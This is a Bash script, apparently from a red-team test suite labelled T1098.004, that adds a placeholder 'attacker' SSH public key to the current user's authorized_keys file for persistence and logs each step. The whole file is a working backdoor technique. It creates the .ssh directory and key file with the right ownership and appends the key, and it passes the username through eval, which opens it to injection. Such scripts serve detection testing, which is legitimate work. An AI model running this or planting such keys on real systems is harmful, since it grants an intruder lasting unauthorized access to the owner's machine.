# Create the output folder if it doesn't exist
output_folder="./Output/Persistence"
mkdir -p "$output_folder"
 
# Output file path
output_file="$output_folder/T1098.004_Persistence.txt"
 
# Attacker's public SSH key (replace this if needed)
attacker_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakeattackersshkeycomment attacker@redteam"
 
# Function to perform SISA Test - Modify SSH Authorized Keys for Persistence
function modify_ssh_authorized_keys_persistence {
    local username="$1"
    local user_home
    user_home=$(eval echo "~$username")
    local ssh_dir="$user_home/.ssh"
    local authorized_keys_file="$ssh_dir/authorized_keys"
 
    echo "Starting SISA Test: Modify SSH Authorized Keys for Persistence" | tee -a "$output_file"
 
    # Check if user exists
    if ! id "$username" &>/dev/null; then
        echo "Error: User '$username' does not exist on this system." | tee -a "$output_file"
        return
    fi
 
    # Ensure .ssh directory exists
    if [ ! -d "$ssh_dir" ]; then
        mkdir -p "$ssh_dir"
        chmod 700 "$ssh_dir"
        chown "$username:$username" "$ssh_dir"
        echo "Created directory: $ssh_dir" | tee -a "$output_file"
    else
        echo "Directory already exists: $ssh_dir" | tee -a "$output_file"
    fi
 
    # Ensure authorized_keys file exists
    if [ ! -f "$authorized_keys_file" ]; then
        touch "$authorized_keys_file"
        chmod 600 "$authorized_keys_file"
        chown "$username:$username" "$authorized_keys_file"
        echo "Created file: $authorized_keys_file" | tee -a "$output_file"
    else
        echo "File already exists: $authorized_keys_file" | tee -a "$output_file"
    fi
 
    # Add attacker key if not already present
    if grep -qxF "$attacker_key" "$authorized_keys_file"; then
        echo "Attacker SSH key already present in $authorized_keys_file" | tee -a "$output_file"
    else
        echo "$attacker_key" >> "$authorized_keys_file"
        echo " Added attacker SSH key to $authorized_keys_file for persistence." | tee -a "$output_file"
    fi
}
 
# Main script logic to execute the SISA test
{
    echo "=========================================================="
    echo "               Executing Chosen SISA Test                 "
    echo "=========================================================="
 
current_user=$(whoami)
modify_ssh_authorized_keys_persistence "$current_user"
}
